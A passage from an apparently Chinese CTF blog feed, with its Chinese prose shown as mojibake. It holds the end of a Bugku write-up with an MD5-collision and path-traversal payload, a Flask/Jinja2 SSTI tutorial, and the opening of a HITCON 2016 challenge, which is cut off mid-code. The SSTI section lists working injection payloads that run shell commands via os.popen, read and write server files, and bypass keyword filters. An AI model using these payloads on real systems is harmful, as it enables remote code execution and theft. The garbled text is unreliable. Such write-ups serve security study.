é™¤æ–‡ä»¶</p><p>é‚£ä¹ˆçŽ°åœ¨å°±è¦æž„é€ bèŽ·å–flag</p><pre><code>./../../../../../../../../flag</code></pre><p>åˆ©ç”¨fastcollå·¥å…·</p><pre><code>fastcoll_v1.0.0.5 -p 1.txt -o 2.txt 3.txt</code></pre><p><img src="/2021/10/28/bugku-noteasytrick/image-20211028201112818.png" alt="image-20211028201112818"></p><p>æ£€æŸ¥åŠç¼–ç è„šæœ¬</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$fh</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">"1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'============================'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//echo urlencode(readmyfile("1.txt"));</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">"2.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//echo '============================';</span><span class="token comment" spellcheck="true">//echo urlencode(readmyfile("2.txt"));</span></code></pre><p><strong>cï¼š</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Jesen</span><span class="token punctuation">{</span>    <span class="token keyword">public</span><span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span><span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">public</span><span class="token variable">$me</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Jesen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>payloadï¼š</strong></p><pre><code>a=.%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%E9%86v%A1b%E9g%7B%C8%8A%84q%C3%7D%E0%B8%83%9B%EA%1C%E1%86%19%17%5E%3A%11%B9%A2%AB%E5%9C%1B%B6%0D%3E%84%D6%F2%8F%E8%EF1%BFm%95%F7%BC%87%C2%D9k%5D4%F1%FE%D7%F7%7B%A5%A0%DF%5D%C5P%BB%0D%27%12%D1%0DlLR%B1%D7%B4%22%D3u%60H%276%BD+%8At%C9%BF%5BOLOAp%C6%C8%AA%82k%93%9E%E8%BC%EB%B8s2%87I%DC%18%2F_I%22%F0%F3%CF%5D%05%9D%B2%0B%7DU&amp;b=.%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%E9%86v%A1b%E9g%7B%C8%8A%84q%C3%7D%E0%B8%83%9Bj%1C%E1%86%19%17%5E%3A%11%B9%A2%AB%E5%9C%1B%B6%0D%3E%84%D6%F2%8F%E8%EF1%BF%ED%95%F7%BC%87%C2%D9k%5D4%F1%FE%D7%F7%FB%A5%A0%DF%5D%C5P%BB%0D%27%12%D1%0DlLR%B1%D7%B4%22%D3u%60H%A76%BD+%8At%C9%BF%5BOLOAp%C6%C8%AA%82k%93%9E%E8%BC%EB%B8s%B2%86I%DC%18%2F_I%22%F0%F3%CF%5D%05%1D%B2%0B%7DU&amp;c=O:5:"Jesen":3:{s:8:"filename";N;s:7:"content";N;s:2:"me";N;}</code></pre><p><img src="/2021/10/28/bugku-noteasytrick/image-20211028201303219.png" alt="image-20211028201303219"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI</title>
      <link href="2021/10/26/ssti/"/>
      <url>2021/10/26/ssti/</url>
      
        <content type="html"><![CDATA[<h3 id="sstiæ¼æ´žæˆå› "><a href="#sstiæ¼æ´žæˆå› " class="headerlink" title="sstiæ¼æ´žæˆå› "></a>sstiæ¼æ´žæˆå› </h3><p>sstiæœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œsstiä¸»è¦ä¸ºpythonçš„ä¸€äº›æ¡†æž¶ jinja2 mako tornado djangoï¼ŒPHPæ¡†æž¶smarty twigï¼Œjavaæ¡†æž¶jade  velocityç­‰ç­‰ä½¿ç”¨äº†æ¸²æŸ“å‡½æ•°æ—¶ï¼Œç”±äºŽä»£ç ä¸è§„èŒƒæˆ–ä¿¡ä»»äº†ç”¨æˆ·è¾“å…¥è€Œå¯¼è‡´äº†æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥ï¼Œæ¨¡æ¿æ¸²æŸ“å…¶å®žå¹¶æ²¡æœ‰æ¼æ´žï¼Œä¸»è¦æ˜¯ç¨‹åºå‘˜å¯¹ä»£ç ä¸è§„èŒƒä¸ä¸¥è°¨é€ æˆäº†æ¨¡æ¿æ³¨å…¥æ¼æ´žï¼Œé€ æˆæ¨¡æ¿å¯æŽ§ã€‚æœ¬æ–‡ç€é‡å¯¹flaskæ¨¡æ¿æ³¨å…¥è¿›è¡Œæµ…æžã€‚</p><h2 id="flaskæ¼æ´žæˆå› "><a href="#flaskæ¼æ´žæˆå› " class="headerlink" title="flaskæ¼æ´žæˆå› "></a>flaskæ¼æ´žæˆå› </h2><p>ä¸ºä»€ä¹ˆè¯´æˆ‘ä»¬ä¸Šé¢çš„ä»£ç ä¼šæœ‰æ¼æ´žå‘¢ï¼Œå…¶å®žå¯¹äºŽä»£ç åŠŸåº•æ¯”è¾ƒæ·±çš„å¸ˆå‚…ï¼Œæ˜¯ä¸ä¼šå­˜åœ¨sstiæ¼æ´žçš„ï¼Œè¢«ä¸€äº›å·æ‡’çš„å¸ˆå‚…ç®€åŒ–äº†ä»£ç ï¼Œæ‰€ä»¥é€ æˆäº†sstiã€‚ä¸Šé¢çš„ä»£ç æˆ‘ä»¬æœ¬å¯ä»¥å†™æˆç±»ä¼¼å¦‚ä¸‹çš„å½¢å¼ã€‚</p><pre><code>&lt;html&gt;  &lt;head&gt;    &lt;title&gt;{{title}} - å°çŒªä½©å¥‡&lt;/title&gt;  &lt;/head&gt; &lt;body&gt;      &lt;h1&gt;Hello, {{user.name}}!&lt;/h1&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>é‡Œé¢æœ‰ä¸¤ä¸ªå‚æ•°éœ€è¦æˆ‘ä»¬æ¸²æŸ“ï¼Œuser.nameï¼Œä»¥åŠtitle</p><p>æˆ‘ä»¬åœ¨app.pyæ–‡ä»¶é‡Œè¿›è¡Œæ¸²æŸ“ã€‚</p><pre><code>@app.route('/')@app.route('/index')#æˆ‘ä»¬è®¿é—®/æˆ–è€…/indexéƒ½ä¼šè·³è½¬def index():   return render_template("index.html",title='Home',user=request.args.get("key"))</code></pre><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸¤ç§ä»£ç çš„å½¢å¼æ˜¯ï¼Œä¸€ç§å½“å­—ç¬¦ä¸²æ¥æ¸²æŸ“å¹¶ä¸”ä½¿ç”¨äº†%(request.url)ï¼Œå¦ä¸€ç§è§„èŒƒä½¿ç”¨index.htmlæ¸²æŸ“æ–‡ä»¶ã€‚æˆ‘ä»¬æ¼æ´žä»£ç ä½¿ç”¨äº†render_template_stringå‡½æ•°ï¼Œè€Œå¦‚æžœæˆ‘ä»¬ä½¿ç”¨render_templateå‡½æ•°ï¼Œå°†å˜é‡ä¼ å…¥è¿›åŽ»ï¼ŒçŽ°åœ¨å³ä½¿æˆ‘ä»¬å†™æˆäº†requestï¼Œæˆ‘ä»¬å¯ä»¥åœ¨urlé‡Œå†™è‡ªå·±æƒ³è¦çš„æ¶æ„ä»£ç </p><pre><code>{{}}```ä¸»è¦å°±æ˜¯è¿™å¥ï¼š```{{"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()}}</code></pre><h2 id="ctfä¸­çš„ä¸€äº›ç»•è¿‡tips"><a href="#ctfä¸­çš„ä¸€äº›ç»•è¿‡tips" class="headerlink" title="ctfä¸­çš„ä¸€äº›ç»•è¿‡tips"></a>ctfä¸­çš„ä¸€äº›ç»•è¿‡tips</h2><p>æ²¡ä»€ä¹ˆç³»ç»Ÿæ€è·¯ã€‚å°±æ˜¯ä¸æ–­æŒ–æŽ˜ç±»ç ”ç©¶å®˜æ–¹æ–‡æ¡£ä»¥åŠå„ç§èƒ½å¤Ÿåˆ©ç”¨çš„å§¿åŠ¿ã€‚è¿™é‡Œä»Žæœ€ç®€å•çš„ç»•è¿‡è¯´èµ·ã€‚</p><p>1.è¿‡æ»¤[]ç­‰æ‹¬å·</p><pre><code>ä½¿ç”¨gititemç»•è¿‡ã€‚å¦‚åŽŸpoc {{"".**class**.**bases**[0]}}</code></pre><pre><code>ç»•è¿‡åŽ{{"".**class**.**bases**.**getitem**(0)}}</code></pre><p>2.è¿‡æ»¤äº†subclassesï¼Œæ‹¼å‡‘æ³•</p><pre><code>åŽŸpoc{{"".**class**.**bases**[0].**subclasses**()}}</code></pre><pre><code>ç»•è¿‡ {{"".**class**.**bases**[0]['**subcla'+'sses**'](https://xz.aliyun.com/t/3679)}}</code></pre><p>3.è¿‡æ»¤class</p><p>ä½¿ç”¨session</p><pre><code>poc {{session['**cla'+'ss**'].**bases**[0].**bases**[0].**bases**[0].**bases**[0].**subclasses**()[118]}}</code></pre><p>å¤šä¸ªbases[0]æ˜¯å› ä¸ºä¸€ç›´åœ¨å‘ä¸Šæ‰¾objectç±»ã€‚ä½¿ç”¨mroå°±ä¼šå¾ˆæ–¹ä¾¿</p><p>æ”¶è—çš„ä¸€äº›poc</p><pre><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls  /var/www/html").read()' )object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls'){{request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]['__in'+'it__']['__'+'glo'+'bal'+'s__']['__bu'+'iltins__']['ev'+'al']('__im'+'port__("os").po'+'pen("ca"+"t a.php").re'+'ad()')}}</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181221165627-4d167624-04fe-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221165627-4d167624-04fe-1.png" alt="img"></a></p><h3 id="å…³äºŽSSTIçš„pythonç±»çš„çŸ¥è¯†"><a href="#å…³äºŽSSTIçš„pythonç±»çš„çŸ¥è¯†" class="headerlink" title="å…³äºŽSSTIçš„pythonç±»çš„çŸ¥è¯†"></a>å…³äºŽSSTIçš„pythonç±»çš„çŸ¥è¯†</h3><pre class=" language-Python"><code class="language-Python">>>> ''.__class__<type 'str'>>>> ().__class__<type 'tuple'>>>> [].__class__<type 'list'>>>> {}.__class__<type 'dict'></code></pre><p><code>__class__</code>ï¼šç”¨æ¥æŸ¥çœ‹å˜é‡æ‰€å±žçš„ç±»ï¼Œæ ¹æ®å‰é¢çš„å˜é‡å½¢å¼å¯ä»¥å¾—åˆ°å…¶æ‰€å±žçš„ç±»ã€‚</p><p>py2å’Œpy3æœ‰å·®<img src="/2021/10/26/ssti/image-20211026211149277.png" alt="image-20211026211149277"></p><pre class=" language-Python"><code class="language-Python">>>> ().__class__.__bases__(<type 'object'>,)>>> ''.__class__.__bases__(<type 'basestring'>,)>>> [].__class__.__bases__(<type 'object'>,)>>> {}.__class__.__bases__(<type 'object'>,)>>> [].__class__.__bases__[0]<type 'object'></code></pre><p><code>__bases__</code>ï¼šç”¨æ¥æŸ¥çœ‹ç±»çš„åŸºç±»ï¼Œä¹Ÿå¯æ˜¯ä½¿ç”¨æ•°ç»„ç´¢å¼•æ¥æŸ¥çœ‹ç‰¹å®šä½ç½®çš„å€¼</p><pre class=" language-Python"><code class="language-Python">>>> [].__class__.__bases__[0].__subclasses__()[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'sys.getwindowsversion'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'nt.stat_result'>, <type 'nt.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <type 'operator.itemgetter'>, <type 'operator.attrgetter'>, <type 'operator.methodcaller'>, <type 'functools.partial'>, <type 'MultibyteCodec'>, <type 'MultibyteIncrementalEncoder'>, <type 'MultibyteIncrementalDecoder'>, <type 'MultibyteStreamReader'>, <type 'MultibyteStreamWriter'>]</code></pre><p><code>__subclasses__()</code>ï¼šæŸ¥çœ‹å½“å‰ç±»çš„å­ç±»</p><p>å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æŽ¥ç”¨<code>object.__subclasses__()</code>ï¼Œä¼šå¾—åˆ°å’Œä¸Šé¢ä¸€æ ·çš„ç»“æžœã€‚<br> èŽ·å–åŸºç±»è¿˜èƒ½ç”¨è¿˜æœ‰<code>__mro__</code>ï¼Œæ¯”å¦‚ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'list'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'tuple'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>            <span class="token operator">//</span>ä½¿ç”¨ç´¢å¼•å°±èƒ½èŽ·å–åŸºç±»äº†<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span></code></pre><h3 id="ä¸€äº›å¸¸ç”¨çš„æ–¹æ³•"><a href="#ä¸€äº›å¸¸ç”¨çš„æ–¹æ³•" class="headerlink" title="ä¸€äº›å¸¸ç”¨çš„æ–¹æ³•"></a>ä¸€äº›å¸¸ç”¨çš„æ–¹æ³•</h3><pre class=" language-python"><code class="language-python"><span class="token operator">//</span>èŽ·å–åŸºæœ¬ç±»<span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>object<span class="token operator">//</span>è¯»æ–‡ä»¶<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span>r<span class="token string">'C:\1.php'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>object<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span>r<span class="token string">'C:\1.php'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">//</span>å†™æ–‡ä»¶<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/input'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span>object<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/input'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">)</span><span class="token operator">//</span>æ‰§è¡Œä»»æ„å‘½ä»¤<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls  /var/www/html").read()'</span> <span class="token punctuation">)</span>object<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls  /var/www/html").read()'</span> <span class="token punctuation">)</span></code></pre><p>ä¸Šé¢æ¼æ´žå¤çŽ°æ—¶å€™çš„payloadä¹Ÿæ˜¯å¾ˆå¼ºäº†ï¼Œç”¨ç±»äºŽç¼–ç¨‹çš„æ–¹å¼æ¥å±•çŽ°ï¼Œä¸ç”¨å†ä¸€ä¸ªä¸ªåŽ»æŸ¥ç´¢å¼•äº†ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__ <span class="token operator">==</span> <span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">}</span>  <span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>  <span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> b<span class="token punctuation">.</span>__class__ <span class="token operator">==</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__ <span class="token operator">%</span><span class="token punctuation">}</span>    <span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token string">'eval'</span> <span class="token keyword">in</span> b<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span>      <span class="token punctuation">{</span><span class="token punctuation">{</span> b<span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("id").read()'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>         <span class="token operator">//</span>poppençš„å‚æ•°å°±æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤    <span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span>  <span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span>  <span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span></code></pre><p>flaské­”æœ¯æ–¹æ³•å½’çº³ï¼š</p><pre><code>__class__  è¿”å›žç±»åž‹æ‰€å±žçš„å¯¹è±¡__mro__    è¿”å›žä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£æžæ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æžã€‚__base__   è¿”å›žè¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»// __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„__subclasses__   æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›žä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨__init__  ç±»çš„åˆå§‹åŒ–æ–¹æ³•__globals__  å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨</code></pre><p><a href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p><p><a href="https://blog.csdn.net/zz_Caleb/article/details/96480967">https://blog.csdn.net/zz_Caleb/article/details/96480967</a></p><p><a href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a></p><p><a href="https://0day.work/jinja2-template-injection-filter-bypasses/">https://0day.work/jinja2-template-injection-filter-bypasses/</a></p><p><a href="https://www.guildhab.top/2019/10/flask-jinja2-ssti-python-%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8/">https://www.guildhab.top/2019/10/flask-jinja2-ssti-python-%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HITCON2016ï¼šLeaking</title>
      <link href="2021/10/25/hitcon2016-leaking/"/>
      <url>2021/10/25/hitcon2016-leaking/</url>
      
        <content type="html"><![CDATA[<pre class=" language-js"><code class="language-js"><span class="token string">"use strict"</span><span class="token punctuation">;</span><span class="token keyword">var</span> randomstring <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"randomstring"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"express"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> <span class="token punctuation">{</span>    VM<span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> flag <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./config.js"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>flagapp<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>    res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/plain"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var flag_"</span> <span class="token operator">+</span> randomstring<span class="token punctuation">.</span><span class="token function">generate</span><span class="token 